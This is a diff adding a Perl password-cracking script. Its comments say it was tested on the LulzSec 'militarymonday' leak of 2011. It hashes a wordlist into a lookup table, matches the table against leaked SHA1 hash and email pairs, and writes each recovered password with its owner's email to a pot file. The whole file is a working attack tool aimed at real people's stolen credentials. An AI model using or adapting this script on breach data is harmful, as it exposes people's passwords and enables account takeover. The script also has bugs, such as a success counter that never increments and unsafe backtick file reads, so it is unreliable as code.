@@ -1,0 +1,71 @@
+#!/usr/bin/perl -w
+# This is a proof of concept i made for base64 UPPER sha1
+# hashes and I tested it with the militarymonday release from lulzsec
+# in July of 2011
+#
+use Digest::SHA1 sha1_base64; # must have this installed! 
+# I'm just using it Funcy(); style. use CPAN, or repo/pkg mgr.
+if (!$ARGV[0]) {
+	print "Usage: ./milMon <milMonFile> <wordList>\n";
+	exit();
+}
+my @pwned = `cat $ARGV[0]`; # .mil file
+my @passwds = `cat $ARGV[1]`; # passwds file
+my $tkn = 0; # token to keep count for less -v output
+my $win = 0; # token for winning!
+my @splt; # split the pwned file.
+my $digest;
+my %hash = (); # for Rainbow tables
+my $email = '';
+open(FLE, ">>pot.txt");
+print "[ ! ] Creating rainbow table, this could take some time\n";
+print "[ ! ] depending on the size of the wordlist...\n";
+$length = $#passwds + 1;
+# We create a Rainbow table Hash (Hashs speed Perl up a bit):
+for ($i=0; $i<$length; $i++) {
+	chomp($passwds[$i]);
+	$orig = $passwds[$i]; # copy the original because we manipulate
+	$passwds[$i] = uc($passwds[$i]); # Uppercase according to @Crackmeifyoucan
+	$passwds[$i] = sha1_base64($passwds[$i]);
+	$passwds[$i] = pad($passwds[$i]); # why doesn't the PM do this?
+	$hash{$passwds[$i]} = $orig; # hash { sha1 } = original word
+}
+print "[ ! ] Rainbow table completed\n";
+# run through each line in the leaked file and crack it.
+foreach (@pwned) { # readinbg the pwned list:
+	if ($_ =~ m/[0-9A-Za-z]/) { # make sure the line is legitimate
+		$tkn++; # token
+		if ($tkn % 1000 == 0)  { 
+			print "[ ! ] " . $tkn . " tested so far.\n";
+		}
+		@splt = split(',', $_); # SHA1,EMAIL
+		$digest = $splt[0];
+		$digest = pad($digest);	
+		$email = $splt[1]; # get email from input line for POT
+		chomp($email);
+		crk($digest);
+	}
+}
+print "[ ! ] " . $win . " passwd\'s recovered!\n" if ($win > 0);
+close FLE; # close file to save changes.
+
+sub pad { # add padding for Base64:
+	$enc = $_[0];
+	if (length($enc) % 4 == 0) {
+		return $enc; # okay string.
+	}else{ 
+		$enc .= '=';
+		pad($enc); # call itself, cos we aren't done.
+	}
+}
+
+sub crk { # reading the wordlist:
+	if ($hash{$_[0]}) { # if it exists in the hash you win! :-)
+		# FINISH HIM !!
+		print $hash{$_[0]} . " is the password for " . $email . "\n";
+		print FLE $hash{$_[0]} . " == " . $email . "\n";
+		return;
+		$win++;
+	}
+}
+
